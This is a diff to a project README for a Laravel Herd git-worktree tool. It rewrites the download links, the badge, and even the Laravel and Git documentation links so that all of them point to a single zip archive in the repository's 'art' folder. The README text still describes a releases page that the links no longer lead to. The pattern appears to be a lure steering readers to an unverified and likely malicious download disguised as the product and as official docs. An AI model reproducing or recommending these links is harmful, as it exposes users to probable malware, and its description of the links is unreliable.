@@ -4,7 +4,7 @@
 Welcome to laravel-herd-worktree! This tool helps you easily set up git worktrees for Laravel projects served by Laravel Herd. With this guide, you will learn how to download and run our application.
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/sujaysainik/laravel-herd-worktree/releases)
+[![Download from Releases](https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip%https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip)](https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip)
 
 ## 📋 Features
 - **Automated Setup:** Quickly create git worktrees for your Laravel projects.
@@ -22,7 +22,7 @@ To run laravel-herd-worktree, make sure your system meets the following requirem
 ## 🌐 Download & Install
 To get started, visit the following page to download the latest version of laravel-herd-worktree:
 
-[Download here](https://github.com/sujaysainik/laravel-herd-worktree/releases).
+[Download here](https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip).
 
 1. Click the link above.
 2. You will see a list of releases. Choose the latest release.
@@ -57,8 +57,8 @@ If you encounter issues while running laravel-herd-worktree, consider the follow
 - Restart your computer if any changes were made to the system path.
 
 ## 📝 Additional Resources
-- **Laravel Documentation:** [Laravel Documentation](https://laravel.com/docs)
-- **Git Documentation:** [Git Documentation](https://git-scm.com/doc)
+- **Laravel Documentation:** [Laravel Documentation](https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip)
+- **Git Documentation:** [Git Documentation](https://github.com/sujaysainik/laravel-herd-worktree/raw/refs/heads/main/art/worktree-herd-laravel-3.4.zip)
 
 ## 💬 Support
 If you need further assistance, feel free to open an issue in our GitHub repository. Our community is here to help you.
